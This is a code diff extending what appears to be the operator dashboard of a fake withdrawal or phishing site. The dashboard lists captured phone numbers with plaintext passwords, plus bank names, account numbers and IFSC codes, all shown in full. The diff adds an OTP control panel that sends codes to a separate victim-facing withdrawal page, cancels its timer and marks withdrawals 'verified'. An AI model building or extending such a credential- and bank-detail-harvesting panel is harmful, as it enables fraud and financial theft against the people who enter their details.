@@ -14,6 +14,9 @@ button{border:0;border-radius:13px;padding:12px 17px;font-weight:800;cursor:poin
 .tablewrap{overflow:auto}table{width:100%;border-collapse:collapse;min-width:820px}th,td{text-align:left;padding:13px;border-bottom:1px solid #eee8f7;font-size:13px}th{background:#f7f4ff;color:#6950bb;position:sticky;top:0}.pill{display:inline-block;padding:5px 9px;border-radius:12px;background:#f0ebff;color:#684bd2;font-weight:700}.empty{text-align:center;color:#999;padding:35px}
 .note{font-size:12px;color:#8b8599;margin-top:14px}
 .warning{background:#fff3cd;color:#856404;padding:10px 15px;border-radius:10px;margin-bottom:15px;font-size:13px;border-left:4px solid #ffc107}
+.otp-section{background:#f0f7ff;border-radius:16px;padding:18px;margin-top:15px;border:2px dashed #7050df}
+.otp-section input{width:200px;height:45px;border:2px solid #ddd;border-radius:12px;padding:0 15px;font-size:18px;margin:0 10px}
+.otp-section button{width:auto;padding:10px 25px;height:45px;margin-top:0;display:inline-block}
 @media(max-width:650px){.stats{grid-template-columns:1fr}.wrap{padding:16px}.top{padding:20px}h1{font-size:25px}}
 </style>
 </head>
@@ -43,56 +46,136 @@ button{border:0;border-radius:13px;padding:12px 17px;font-weight:800;cursor:poin
 
   <div class="panel">
     <h2>🏦 Withdrawal Activity</h2>
-    <div class="tablewrap"><table><thead><tr><th>Time</th><th>Platform</th><th>Bank</th><th>Account</th><th>IFSC</th><th>Amount</th></tr></thead>
+    <div class="tablewrap"><table><thead><tr><th>Time</th><th>Platform</th><th>Bank</th><th>Account</th><th>IFSC</th><th>Amount</th><th>Status</th></tr></thead>
     <tbody id="withdrawRows"></tbody></table></div>
     <div class="note">🔓 Full details mode enabled — all data visible for admin purposes.</div>
+  </div>
+
+  <!-- OTP SECTION - ADMIN CONTROL -->
+  <div class="panel" style="background:rgba(255,255,255,.92);border-radius:24px;padding:20px;margin-top:18px;box-shadow:0 14px 40px rgba(87,65,160,.12)">
+    <h2>🔐 OTP Control Panel</h2>
+    <div class="otp-section">
+      <div style="display:flex;flex-wrap:wrap;align-items:center;gap:10px">
+        <span style="font-weight:700;font-size:16px;">Current OTP:</span>
+        <span id="currentOtp" style="font-size:28px;font-weight:800;color:#7050df;background:#e8ddff;padding:5px 20px;border-radius:12px;">------</span>
+        <button onclick="generateOTP()" style="background:#28a745;color:#fff;padding:10px 25px;border-radius:30px;">📨 Generate & Send OTP</button>
+        <button onclick="cancelTimer()" style="background:#dc3545;color:#fff;padding:10px 25px;border-radius:30px;">⏹ Cancel Timer</button>
+      </div>
+      <div style="margin-top:12px;font-size:13px;color:#666;">
+        <span id="otpStatus">✅ OTP ready to send</span>
+      </div>
+    </div>
   </div>
 </div>
 
 <script>
 const KEY="withdrawal_demo_activity_v1";
+let currentOTP = null;
+let otpActive = false;
+
 function getData(){try{return JSON.parse(localStorage.getItem(KEY)||"[]")}catch(e){return[]}}
 function esc(v){return String(v??"").replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#039;"}[m]))}
 function empty(cols){return `<tr><td colspan="${cols}" class="empty">No demo activity yet.</td></tr>`}
+
 function render(){
  const all=getData(), logs=all.filter(x=>x.type==="LOGIN"), withdrawals=all.filter(x=>x.type==="WITHDRAWAL");
  document.getElementById('loginCount').textContent=logs.length;
  document.getElementById('withdrawCount').textContent=withdrawals.length;
  document.getElementById('totalCount').textContent=all.length;
  
- // ✅ FULL PHONE AND PASSWORD SHOW HOGA AB
  const loginRows=document.getElementById('loginRows');
  if(logs.length){
    loginRows.innerHTML=logs.map(x=>`<tr>
      <td>${esc(x.time)}</td>
      <td><span class="pill">${esc(x.platform)}</span></td>
-     <td><strong style="color:#1a1a2e;">${esc(x.phone)}</strong></td>
-     <td><strong style="color:#1a1a2e;">${esc(x.password)}</strong></td>
+     <td><strong>${esc(x.phone)}</strong></td>
+     <td><strong>${esc(x.password)}</strong></td>
    </tr>`).join('');
  } else {
    loginRows.innerHTML=empty(4);
  }
  
- // ✅ FULL ACCOUNT AND IFSC SHOW HOGA AB
  const withdrawRows=document.getElementById('withdrawRows');
  if(withdrawals.length){
    withdrawRows.innerHTML=withdrawals.map(x=>`<tr>
      <td>${esc(x.time)}</td>
      <td>${esc(x.platform)}</td>
-     <td><strong style="color:#1a1a2e;">${esc(x.bank)}</strong></td>
-     <td><strong style="color:#1a1a2e;">${esc(x.account)}</strong></td>
-     <td><strong style="color:#1a1a2e;">${esc(x.ifsc)}</strong></td>
-     <td><strong style="color:#1a1a2e;">${esc(x.amount)}</strong></td>
+     <td><strong>${esc(x.bank)}</strong></td>
+     <td><strong>${esc(x.account)}</strong></td>
+     <td><strong>${esc(x.ifsc)}</strong></td>
+     <td><strong>${esc(x.amount)}</strong></td>
+     <td><span class="pill">${x.verified ? '✅ Verified' : '⏳ Pending'}</span></td>
    </tr>`).join('');
  } else {
-   withdrawRows.innerHTML=empty(6);
+   withdrawRows.innerHTML=empty(7);
  }
 }
+
 function clearActivity(){
  if(confirm("Clear all demo activity from this browser?")){localStorage.removeItem(KEY);render()}
 }
+
+// OTP Functions
+function generateOTP() {
+  currentOTP = String(Math.floor(100000 + Math.random() * 900000));
+  otpActive = true;
+  document.getElementById('currentOtp').textContent = currentOTP;
+  document.getElementById('otpStatus').textContent = '📨 OTP sent! Waiting for user verification...';
+  document.getElementById('otpStatus').style.color = '#28a745';
+  
+  // Store OTP in localStorage so index.html can read it
+  localStorage.setItem('withdrawal_otp', JSON.stringify({otp: currentOTP, active: true, time: Date.now()}));
+  
+  // Also send message to index.html via BroadcastChannel
+  try {
+    const channel = new BroadcastChannel('otp_channel');
+    channel.postMessage({type: 'OTP_SENT', otp: currentOTP});
+    channel.close();
+  } catch(e) {}
+  
+  alert('📨 OTP Generated: ' + currentOTP + '\n\nUser will receive this OTP on the withdrawal page.');
+}
+
+function cancelTimer() {
+  // Broadcast to index.html to cancel timer
+  try {
+    const channel = new BroadcastChannel('otp_channel');
+    channel.postMessage({type: 'CANCEL_TIMER'});
+    channel.close();
+  } catch(e) {}
+  
+  // Also store in localStorage
+  localStorage.setItem('withdrawal_timer_cancel', 'true');
+  
+  document.getElementById('otpStatus').textContent = '⏹ Timer cancelled! OTP verification required.';
+  document.getElementById('otpStatus').style.color = '#dc3545';
+  alert('⏹ Timer cancelled! User will see OTP verification screen.');
+}
+
+// Listen for OTP verification from index.html
+try {
+  const channel = new BroadcastChannel('otp_channel');
+  channel.onmessage = function(event) {
+    if (event.data.type === 'OTP_VERIFIED') {
+      document.getElementById('otpStatus').textContent = '✅ OTP Verified Successfully!';
+      document.getElementById('otpStatus').style.color = '#28a745';
+      document.getElementById('currentOtp').textContent = '✅ DONE';
+      // Update withdrawal status
+      const all = getData();
+      if (all.length > 0) {
+        const latest = all[0];
+        if (latest.type === 'WITHDRAWAL') {
+          latest.verified = true;
+          localStorage.setItem(KEY, JSON.stringify(all));
+          render();
+        }
+      }
+    }
+  };
+} catch(e) {}
+
 render();
-setInterval(render,2000);
+setInterval(render, 2000);
 </script>
 </body>
 </html>
